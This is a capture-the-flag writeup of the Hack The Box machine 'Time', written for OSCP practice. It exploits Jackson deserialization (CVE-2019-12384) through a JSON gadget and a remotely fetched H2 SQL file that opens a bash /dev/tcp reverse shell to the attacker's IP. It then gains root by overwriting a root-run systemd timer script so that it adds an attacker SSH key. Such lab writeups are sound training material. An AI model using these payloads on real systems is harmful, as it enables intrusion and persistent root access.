---
layout: post
title:  "Hack The Box - Time - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Time-Writeup" %}

# Introduction
The hack the box machine "Time" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about deserialization attacks, systemd timers and Linux file permissions. The most challenge part is, however, to locate the right CVE since there aren't many good indicators for which CVE:s that would work on the target.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover a web application on port 80. This web application can beautify and validate JSON data. By requesting the validation of some JSON data, it is possible to trigger an exception in the backend which discloses that the Java library [Jackson](https://github.com/FasterXML/jackson) is used to deserialize the JSON data. It is then possible to use [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384) to get a shell on the target. Thereafter, the privilege escalation can be formed by modifying a script which is executed as `root` every 10 seconds using a systemd timer.

<!-- Check if "beautify" is vulnerable to the CVE-->

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.214`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port 22 and 80 are open.

![nmap](/assets/{{ imgDir }}/nmap.png)

If we navigate to the web application on port 80 in a browser, we are greeted with a web page which can beautify and validate JSON data.

![webapp](/assets/{{ imgDir }}/webapp.png)

![dropdown](/assets/{{ imgDir }}/dropdown.png)

If we expand the dropdown menu, we can see that the validation feature is in a [beta](https://en.wikipedia.org/wiki/Software_release_life_cycle#Beta) state. Software in a beta state is normally in a working condition but might contain bugs, making this an interesting feature to study further.

![webappError](/assets/{{ imgDir }}/webappError.png)

If we send a request to validate some JSON data such as `{"key":"value"}`, we receive an error message, as can be seen above. The full error message, shown below, informs us that an exception occured in `com.fasterxml.jackson`. This discloses that the backend is using [Jackson](https://github.com/FasterXML/jackson) which is a Java library for serializing and deserializing JSON data. 

{% highlight none linenos %}
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
{% endhighlight %}

After some googling, it is possible to find [a couple of CVE:s](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jackson) for the Jackson library. One of the CVE:s which can be identified is [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384). When searching for more information about this vulnerability, it is possible to find a [blog post](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) explaining how to exploit the vulnerability. In the blog post, the authors explain that the CVE enables the execution of arbitrary SQL statements when the Jackson library deserializes and then re-serialize the JSON object below.

{% highlight JSON linenos %}
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]
{% endhighlight %}

When this JSON data is deserialized, a [DriverManagerConnectionSource](https://github.com/qos-ch/logback/blob/master/logback-core/src/main/java/ch/qos/logback/core/db/DriverManagerConnectionSource.java#L30) object is created. This object has a parameter named "url" which is set to the value `jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'`. This is performed automatically when the deserialization is performed since the [setUrl](https://github.com/qos-ch/logback/blob/master/logback-core/src/main/java/ch/qos/logback/core/db/DriverManagerConnectionSource.java#L73) function of the `DriverManagerConnectionSource` class is automatically invoked as it is a setter function. As can be seen below, this setter function simply sets the value of the object's `url` parameter to the value of the `url` parameter in the JSON object. 

{% highlight java linenos %}
public void setUrl(String url) {
        this.url = url;
}
{% endhighlight %}

{% highlight java linenos %}
public Connection getConnection() throws SQLException {
    if (getUser() == null) {
        return DriverManager.getConnection(url);
    } else {
        return DriverManager.getConnection(url, getUser(), getPassword());
    }
}
{% endhighlight %}

At a later point, the web application serializes the object and thus invokes getter functions to obtain values of properties that should be serialized. One of the getter functions is [getConnection](https://github.com/qos-ch/logback/blob/9b67089750e64cd9f8091a1e9d315fdb527221df/logback-core/src/main/java/ch/qos/logback/core/db/DriverManagerConnectionSource.java#L50) whose code is shown above. The `getConnection` getter function invokes [DriverManager.getConnection](https://docs.oracle.com/javase/8/docs/api/java/sql/DriverManager.html#getConnection-java.lang.String-java.lang.String-java.lang.String-) with the URL that was set using the `setUrl` function. This instatiates a [Java Database Connectivity](https://en.wikipedia.org/wiki/Java_Database_Connectivity) (JDBC) connection to the URL `http://localhost:8000/inject.sql`. The database software then downloads the SQL file and executes its SQL code. The authors of the blog post also explain that the SQL code below can be used to execute arbitrary shell commands. This SQL code was originally described in [another blog post](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) from 2018.

{% highlight SQL linenos %}
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id > exploited.txt')
{% endhighlight %}

To check if the exploit works, we modify line 6 of the SQL code to contain a command which pings our host 10 times. As such, if we start receiving ICMP packets, we know that we have remote code execution on the target.

{% highlight sql linenos %}
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('ping -c 10 10.10.14.4')
{% endhighlight %}

We place the content above in a file named "inject.sql". Then, we start a python web server in the directory where we saved this file by executing  `python3 -m http.server 80` and start Wireshark by executing `wireshark`. We then substitute `localhost:8000` for our IP `10.10.14.4` in the malicious JSON object seen earlier, paste it into the validation form and press "PROCESS".

<div id="malicious-JSON"></div>
![sendSSRFPayload](/assets/{{ imgDir }}/sendSSRFPayload.png)

![webServer](/assets/{{ imgDir }}/webServer.png)

After a couple of seconds, the target hosts requests the `inject.sql` file from the python web server and we can see ICMP packets being sent to us from the target.

![wireshark](/assets/{{ imgDir }}/wireshark.png)

The next step is to acquire a shell. We can execute the reverse shell payload `bash -i >& /dev/tcp/10.10.14.4/443 0>&1` using the SQL file by modifying it as shown below.

{% highlight SQL linenos %}
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.4/443 0>&1')
{% endhighlight %}

![shell](/assets/{{ imgDir }}/shell.png)

Next, we start a netcat listener by executing `nc -lvnp 443` and resend [the request]({{path}}#malicious-JSON) which contained our malicious JSON object. After a couple of seconds, the listener receives a connection and we obtain a shell on the target!

# Privilege Escalation
When enumerating a target for privilege escalation possiblities, it is common to check for cron jobs. These are configurations which define at what times, dates or intervals to execute certain tasks. When searching for scheduled tasks, it is important to not only stop at cron jobs but to also investigate systemd timers. 

Systemd timers are similar to cron jobs in the sense that their main purpose is to run tasks at a specific point in time. A key difference, however, is that systemd timers are more complex and offer a greater flexibility. For example, each timer corresponds to a systemd service which represents the task that the systemd timer executes when triggered.

In addition, systemd timers can be enabled or disabled with the prefix `systemctl enable/disable` and be started or stopped with the prefix `systemtl start/stop`. Apart from this, systemd timers can also be triggered on more complex conditions than cron jobs. For example, it is possible for a systemd timer to execute its corresponding service a couple of minutes after boot or when a device is plugged into a USB port. 

![timers](/assets/{{ imgDir }}/timers.png)

We can enumerate systemd timers by executing `systemctl list-timers --all`. Executing this command on the target results in 12 timers, as demonstrated above. If we compare the values in the `NEXT` and `LAST` columns, we can deduce how often each timer is triggered. For example, we can deduce that the top-most timer `timer_backup.timer` is executed every 10 seconds and that the second timer `phpsessionclean.timer` is executed every 30 minutes. 

As can be seen in the `ACTIVATES` column, the first timer `timer_backup.timer` activates the service `timer_backup.service`. We can obtain more information about this service by executing `systemctl cat timer_backup.service` to show the contents of its configuration file. This results in the output below which informs us that the service simply restarts another service named "web_backup.service".

{% highlight none linenos %}
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
{% endhighlight %}

We can execute `systemctl cat web_backup.service` to see how the `web_backup.service` service is configured. From the output, shown below, we can see that the service executes the command `/bin/bash /usr/bin/timer_backup.sh` when it is started. Since we know that this service is restarted every 10 seconds, we know that the `/usr/bin/timer_backup.sh` script is executed every 10 seconds as well. We also know that it is executed by `root` since no user was explicitly stated in the services' configurations and the default user for systemd tasks is `root`.

{% highlight none linenos %}
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
{% endhighlight %}

![timerBackup](/assets/{{ imgDir }}/timerBackup.png)

If we check the file permissions of the script by executing `ls -l /usr/bin/timer_backup.sh`, we can see that we are actually the owner of the file. This means that we can change its content. At this point, we could add our reverse shell payload to the file to get a shell as `root`. However, the shell would only be working for 10 seconds since the process is restarted every 10 seconds. A better solution is to configure SSH for the `root` user so that we can obtain a `root` shell by connecting to the target over SSH. To do this, we start by executing `ssh-keygen -f ./id_rsa` to generate a RSA key pair. We use the `-f` flag to specify that the generated private and public key should be saved in the current directory.

![keygen](/assets/{{ imgDir }}/keygen.png)

{% highlight bash linenos %}
echo 'mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
{% endhighlight %}
Then, we execute the command above to place the command `mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ss h/authorized_keys` in the `timer_backup.sh` file. This command creates a `.ssh` directory in the `root` user's home directory and adds our public key to a file named "authorized_keys" in this directory. Note that `[id_rsa.pub]` should be the content of the `id_rsa.pub` file we generated earlier, as demonstrated below.

{% highlight none linenos %}
pericles@time:/var/www/html$ echo 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
<ot/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
pericles@time:/var/www/html$ cat /usr/bin/timer_backup.sh
cat /usr/bin/timer_backup.sh
mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys
pericles@time:/var/www/html$
{% endhighlight %}

![rootSSH](/assets/{{ imgDir }}/rootSSH.png)

After waiting for 10 seconds, we know that the command has executed and has configured SSH for the `root` user. At this point, we can get a `root` shell by simply executing `ssh -i id_rsa root@10.10.10.214` to log in over SSH with our private key!